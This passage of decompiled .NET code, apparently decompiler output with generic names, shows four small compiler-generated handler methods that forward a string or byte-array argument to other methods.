	[SpecialName]
	[DebuggerStepThrough]
	[CompilerGenerated]
	private void method_4(object object_0)
	{
		method_2(Conversions.ToString(object_0));
	}

	[SpecialName]
	[DebuggerStepThrough]
	[CompilerGenerated]
	private void method_5(object object_0)
	{
		method_2(Conversions.ToString(object_0));
	}

	[SpecialName]
	[CompilerGenerated]
	[DebuggerStepThrough]
	private void method_6(object object_0)
	{
		method_2(Conversions.ToString(object_0));
	}

	[SpecialName]
	[DebuggerStepThrough]
	[CompilerGenerated]
	private void method_7(object object_0)
	{
		method_0((byte[])object_0);
	}
}
